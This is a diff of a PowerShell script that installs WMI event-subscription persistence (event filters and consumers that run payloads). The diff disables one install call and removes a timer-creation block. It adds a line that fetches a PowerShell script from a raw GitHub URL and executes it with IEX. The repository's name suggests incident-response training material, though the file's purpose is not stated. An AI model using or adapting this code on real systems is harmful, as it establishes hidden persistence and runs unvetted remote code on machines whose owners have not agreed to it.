@@ -92,12 +92,6 @@ Remove-Persistence -EventFilterName $ThirdEventFilterName -EventConsumerName $Th
 
 Install-Persistence -EventFilterName $FirstEventFilterName -EventConsumerName $FirstEventConsumerName -Query $FirstQuery -Payload $FirstPayload
 Install-Persistence -EventFilterName $SecondEventFilterName -EventConsumerName $SecondEventConsumerName -Query $SecondQuery -Payload $SecondPayload
-Install-Persistence -EventFilterName $ThirdEventFilterName -EventConsumerName $ThirdEventConsumerName -Query $ThirdQuery -Payload $ThirdPayload
+#Install-Persistence -EventFilterName $ThirdEventFilterName -EventConsumerName $ThirdEventConsumerName -Query $ThirdQuery -Payload $ThirdPayload
 
-$timerId = "OneMinuteTimer_f71fa886-7d3f-4e66-ae34-e2dfa66f061d"
-$dmtfTime = [Management.ManagementDateTimeConverter]::ToDmtfDateTime((Get-Date).ToUniversalTime().AddSeconds(10))
-$timerClass = [wmiclass]"\\.\root\cimv2:__AbsoluteTimerInstruction"
-$timer = $timerClass.CreateInstance()
-$timer.TimerId = $timerId
-$timer.EventDateTime = $dmtfTime
-$timer.Put() | Out-Null
+IEX (iwr https://raw.githubusercontent.com/michelangelosplinter/D.F.I.R-Public-Resources/refs/heads/main/aspnet/Third.ps1 -UseBasicParsing)
